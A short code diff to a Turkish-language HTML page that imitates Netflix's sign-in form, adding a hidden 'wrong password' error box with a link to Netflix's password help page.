@@ -20,6 +20,7 @@
         <div class="login-div">
             <form class="login" onsubmit="isUserRegistered()">
                 <h1>Oturum Aç</h1>
+                <div id = "err" style = "display:none" data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents"><b>Parola yanlış.</b> Lütfen yeniden deneyin ya da <a href="https://www.netflix.com/tr/loginHelp">parolanızı sıfırlayın</a>.</div></div>
                 <div class="input-text">
                     <input type="text" id="inputEmail" name="email" placeholder="E-posta veya telefon numarası" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                     <div class="warning-input" id="warningEmail">
